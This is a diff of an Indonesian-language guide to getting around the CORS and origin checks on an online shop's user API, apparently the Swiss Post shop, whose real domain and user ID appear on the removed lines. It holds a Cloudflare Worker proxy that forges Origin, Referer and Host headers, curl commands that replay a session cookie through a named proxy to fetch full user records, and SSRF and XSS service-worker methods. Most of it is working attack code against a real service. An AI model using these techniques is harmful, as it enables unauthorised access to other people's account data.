@@ -14,7 +14,7 @@ location /api/ {
 ```javascript
 // Bisa override response headers
 const corsHeaders = {
-  'Access-Control-Allow-Origin': 'https://shop.post.ch',  // Spoof origin!
+  'Access-Control-Allow-Origin': 'https://target.com',  // Spoof origin!
   'Access-Control-Allow-Methods': 'GET,HEAD,POST,OPTIONS',
 };
 ```
@@ -44,7 +44,7 @@ async function handleRequest(request) {
   const url = new URL(request.url)
   
   // Target API mas
-  const targetUrl = 'https://apis.shop.post.ch' + url.pathname + url.search
+  const targetUrl = 'https://target.com' + url.pathname + url.search
   
   // Buat request baru ke target
   let modifiedRequest = new Request(targetUrl, {
@@ -54,8 +54,8 @@ async function handleRequest(request) {
   })
   
   // 🔥 KUNCI BYPASS: Set Origin ke yang diallowed!
-  modifiedRequest.headers.set('Origin', 'https://shop.post.ch')
-  modifiedRequest.headers.set('Referer', 'https://shop.post.ch/')
+  modifiedRequest.headers.set('Origin', 'https://target.com')
+  modifiedRequest.headers.set('Referer', 'https://target.com/')
   
   // Kirim ke target
   let response = await fetch(modifiedRequest)
@@ -73,12 +73,12 @@ Atau
 
 ```javascript
 // ============================================
-// CORS BYPASS PROXY FOR shop.post.ch
+// CORS BYPASS PROXY FOR target.com
 // ============================================
 
 // Target API yang mau di-bypass
-const TARGET_API = 'https://apis.shop.post.ch';
-const ALLOWED_ORIGIN = 'https://shop.post.ch';
+const TARGET_API = 'https://target.com';
+const ALLOWED_ORIGIN = 'https://target.com';
 
 async function handleRequest(request) {
   const url = new URL(request.url);
@@ -99,7 +99,7 @@ async function handleRequest(request) {
   // 🔥 KUNCI BYPASS: Set Origin ke yang di-allow server
   modifiedHeaders.set('Origin', ALLOWED_ORIGIN);
   modifiedHeaders.set('Referer', ALLOWED_ORIGIN + '/');
-  modifiedHeaders.set('Host', 'apis.shop.post.ch');
+  modifiedHeaders.set('Host', 'target.com');
   
   // Hapus header yang mungkin bikin masalah
   modifiedHeaders.delete('X-Forwarded-For');
@@ -185,7 +185,7 @@ https://bypass-cors.kaizen100801.workers.dev/
 ```bash
 # Akses user data via proxy (dengan cookie)
 curl -b "OPCSESSIONID=Y5-b82a36e0-f7ef-4d8d-b370-c93d025922e6" \
-  "https://bypass-cors.kaizen100801.workers.dev/occ/v2/postshop-spa/users/16737348?fields=FULL"
+  "https://bypass-cors.kaizen100801.workers.dev/occ/v2/postshop-spa/users/1233434?fields=FULL"
 
 # Akses current user (dengan cookie)
 curl -b "OPCSESSIONID=Y5-b82a36e0-f7ef-4d8d-b370-c93d025922e6" \
@@ -207,7 +207,7 @@ Karena response `403 Invalid CORS request` terjadi di preflight/GET, coba pake f
 <html>
 <body>
   <form id="corsForm" method="GET" 
-        action="https://apis.shop.post.ch/occ/v2/postshop-spa/users/16737348?fields=FULL"
+        action="https://target.com/occ/v2/postshop-spa/users/1233434?fields=FULL"
         target="_blank"
         enctype="text/plain">
     <input type="submit" value="Bypass CORS">
@@ -223,23 +223,23 @@ Karena response `403 Invalid CORS request` terjadi di preflight/GET, coba pake f
 
 ### **Method 3: Menggunakan Server-side Request Forgery (SSRF)**
 
-Jika ada endpoint di `shop.post.ch` yang bisa fetch external:
+Jika ada endpoint di `target.com` yang bisa fetch external:
 
 ```javascript
 // Cari endpoint seperti:
-GET https://shop.post.ch/api/proxy?url=https://apis.shop.post.ch/...
-GET https://shop.post.ch/image-proxy?img=https://apis.shop.post.ch/...
-POST https://shop.post.ch/webhook/test?target=https://apis.shop.post.ch/...
+GET https://target.com/api/proxy?url=https://target.com/...
+GET https://target.com/image-proxy?img=https://target.com/...
+POST https://target.com/webhook/test?target=https://target.com/...
 ```
 
 ### **Method 4: Reload via Service Worker (Paling Advanced)**
 
 ```javascript
-// Install service worker di https://shop.post.ch (butuh XSS dulu)
-// Tapi kalau mas bisa inject code di shop.post.ch, bisa bypass total
+// Install service worker di https://target.com (butuh XSS dulu)
+// Tapi kalau mas bisa inject code di target.com, bisa bypass total
 
 self.addEventListener('fetch', event => {
-  if (event.request.url.includes('apis.shop.post.ch')) {
+  if (event.request.url.includes('target.com')) {
     // Intercept request ke API
     event.respondWith(
       fetch(event.request, {
@@ -259,27 +259,27 @@ Berdasarkan response `403 Invalid CORS request`, ada kemungkinan **Origin valida
 
 ### **Test 1: Origin Spoofing dengan Huruf Besar/Kecil**
 ```bash
-curl -H "Origin: https://SHOP.post.ch" \  # uppercase
-     -H "Origin: https://shop.post.ch/" \ # tambah slash
-     -H "Origin: https://shop.post.ch:443" \ # tambah port
-     "https://apis.shop.post.ch/occ/v2/postshop-spa/users/16737348?fields=FULL"
+curl -H "Origin: https://target.com" \  # uppercase
+     -H "Origin: https://target.com/" \ # tambah slash
+     -H "Origin: https://target.com:443" \ # tambah port
+     "https://target.com/occ/v2/postshop-spa/users/1233434?fields=FULL"
 ```
 
 ### **Test 2: Bypass dengan Header Lain**
 ```bash
 # Coba paket header lengkap dari browser legitimate
-curl -H "Origin: https://shop.post.ch" \
-     -H "Referer: https://shop.post.ch/" \
+curl -H "Origin: https://target.com" \
+     -H "Referer: https://target.com/" \
      -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
      -H "Accept: application/json" \
-     "https://apis.shop.post.ch/occ/v2/postshop-spa/users/16737348?fields=FULL"
+     "https://target.com/occ/v2/postshop-spa/users/1233434?fields=FULL"
 ```
 
 ### **Test 3: Menggunakan Meta Refresh (Client-side redirect)**
 ```html
 <!-- Ini kadang bypass karena requestnya dari page yang sama -->
 <meta http-equiv="refresh" 
-      content="0; url=https://apis.shop.post.ch/occ/v2/postshop-spa/users/16737348?fields=FULL">
+      content="0; url=https://target.com/occ/v2/shop-spa/users/1233434?fields=FULL">
 ```
 
 ---
@@ -291,14 +291,14 @@ curl -H "Origin: https://shop.post.ch" \
 git clone https://github.com/Rob--W/cors-anywhere
 cd cors-anywhere
 node server.js
-# Akses: http://localhost:8080/https://apis.shop.post.ch/...
+# Akses: http://localhost:8080/https://target.com/...
 
 # 2. Using Burp Suite - Match and Replace
 # Tools -> Options -> Match and Replace
-# Add rule: Replace "Origin: .*" with "Origin: https://shop.post.ch"
+# Add rule: Replace "Origin: .*" with "Origin: https://target.com"
 
 # 3. Browser extension - Modify Header Value
 # Install "ModHeader" Chrome extension
-# Add header: Origin = https://shop.post.ch
+# Add header: Origin = https://target.com
 ```
 
